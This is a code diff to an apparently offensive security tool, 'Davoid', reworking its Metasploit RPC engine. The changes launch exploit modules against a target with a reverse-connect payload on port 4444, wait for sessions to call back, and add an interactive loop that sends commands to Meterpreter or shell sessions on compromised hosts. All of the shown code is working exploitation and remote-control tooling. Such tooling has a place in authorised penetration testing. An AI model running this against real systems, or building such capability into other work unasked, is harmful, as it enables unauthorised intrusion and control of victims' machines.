@@ -199,10 +199,20 @@ class MetasploitRPCEngine:
 
         try:
             exploit = self.client.modules.use('exploit', custom_mod)
-            exploit['RHOSTS'] = target
-            exploit['RPORT'] = rport
 
-            payload_opts = {'LHOST': lhost, 'LPORT': 4444}
+            # Apply options securely checking if the module requires them
+            exploit['RHOSTS'] = target
+            if 'RPORT' in exploit.options:
+                exploit['RPORT'] = rport
+
+            # By forcing RunAsJob, we ensure the RPC client doesn't tear down the listener
+            payload_opts = {
+                'LHOST': lhost,
+                'LPORT': 4444,
+                'DisablePayloadHandler': False,
+                'RunAsJob': True
+            }
+
             job = exploit.execute(payload=custom_payload, **payload_opts)
 
             # SAFE TYPE CHECK
@@ -211,14 +221,20 @@ class MetasploitRPCEngine:
                     f"[bold green][+] Exploit launched successfully (Job ID: {job['job_id']})[/bold green]")
                 db.log("MSF-Engine", target,
                        f"Launched {custom_mod} via RPC", "HIGH")
-            elif job is True:
-                console.print(
-                    f"[bold green][+] Exploit executed successfully (Foreground task).[/bold green]")
-                db.log("MSF-Engine", target,
-                       f"Launched {custom_mod} via RPC", "HIGH")
             else:
                 console.print(
-                    f"[yellow][!] Exploit ran, but returned an unexpected response: {job}[/yellow]")
+                    f"[yellow][+] Exploit executed, response: {job}[/yellow]")
+
+            # Wait a few seconds for the payload to trigger and connect back
+            with console.status("[bold cyan]Waiting for session to establish...[/bold cyan]", spinner="bouncingBar"):
+                time.sleep(5)
+                sessions = self.client.sessions.list
+                if sessions:
+                    console.print(
+                        f"[bold green][+] Success! {len(sessions)} session(s) active.[/bold green]")
+                else:
+                    console.print(
+                        "[yellow][-] No session established yet. The target might not be vulnerable, or it needs more time.[/yellow]")
 
         except Exception as e:
             console.print(
@@ -268,30 +284,36 @@ class MetasploitRPCEngine:
             console.print("[bold red][!] Invalid Session ID.[/bold red]")
             return
 
+        session_type = sessions[session_id].get('type', 'Unknown')
         shell = self.client.sessions.session(session_id)
+
         console.print(Panel(
-            f"[bold green][+] Interacting with Session {session_id}[/bold green]\n[dim]Type 'exit', 'quit', or 'background' to return to Davoid.[/dim]", border_style="green"))
+            f"[bold green][+] Interacting with {session_type.capitalize()} Session {session_id}[/bold green]\n"
+            f"[dim]Type 'exit', 'quit', or 'background' to return to Davoid.[/dim]",
+            border_style="green"
+        ))
 
         while True:
             try:
                 cmd = questionary.text(
-                    f"Meterpreter/Shell {session_id} >", style=Q_STYLE).ask()
+                    f"{session_type.capitalize()} {session_id} >", style=Q_STYLE).ask()
 
                 if not cmd:
                     continue
                 if cmd.lower() in ['exit', 'quit', 'background']:
                     break
 
-                # Write the command to the RPC session
-                shell.write(cmd + '\n')
-
-                # Small delay to let the command execute and buffer the output
-                time.sleep(1.5)
-
-                # Read the response
-                output = shell.read()
-                if output:
-                    console.print(f"[white]{output}[/white]")
+                # Meterpreter and standard shells use different execution methods in PyMetasploit3
+                if session_type == 'meterpreter':
+                    output = shell.run_with_output(cmd)
+                    if output:
+                        console.print(f"[white]{output}[/white]")
+                else:
+                    shell.write(cmd + '\n')
+                    time.sleep(1.5)  # Buffer time for the shell to process
+                    output = shell.read()
+                    if output:
+                        console.print(f"[white]{output}[/white]")
 
             except KeyboardInterrupt:
                 console.print(
@@ -299,7 +321,7 @@ class MetasploitRPCEngine:
                 break
             except Exception as e:
                 console.print(
-                    f"[bold red][!] Error interacting with shell:[/bold red] {e}")
+                    f"[bold red][!] Error interacting with session:[/bold red] {e}")
                 break
 
     def cleanup(self):
